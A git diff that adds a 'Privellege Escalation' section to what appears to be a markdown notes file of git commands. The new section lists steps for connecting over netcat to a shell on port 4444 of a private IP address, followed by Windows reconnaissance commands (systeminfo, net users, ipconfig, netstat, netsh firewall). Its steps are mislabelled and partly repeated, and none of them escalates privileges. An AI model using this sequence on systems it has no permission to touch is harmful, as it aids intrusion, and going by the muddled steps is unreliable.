@@ -306,3 +306,68 @@ $ git diff origin..master
 ```bash
 $ git diff --stat HEAD
 ```
+
+### Privellege Escalation
+Step 1: launch Apache web server
+~~~
+# service apache2 status
+~~~
+```bash
+nmap -sT 192.168.1.27 4444
+```
+
+Step 2: Check if port 4444 opened
+```bash
+netstat -an | find "4444"
+```
+Step 3: Check if port 4444 opened
+```bash
+nmap -sT 192.168.1.27
+```
+
+Step 4: Gain Access
+
+```bash
+nc 192.168.1.27 4444
+```
+
+Step 5: List Directories
+```bash
+dir
+```
+
+Step 6: List the system details
+```bash
+systeminfo
+```
+
+Step 7: Find the hostname
+```bash
+hostname
+```
+
+Step 8: Find the users in the environment
+```bash
+net users
+```
+
+Step 8 a: Find the ip address of everyone
+```bash
+ipconfig/all
+```
+
+
+Step 9: Detect systems in the environment
+```bash
+route print
+```
+
+Step 10: Search for vulnerable devices
+```bash
+netstat -ano
+```
+
+Step 11: Search for open ports that are enabled
+```bash
+netsh firewall show state
+```
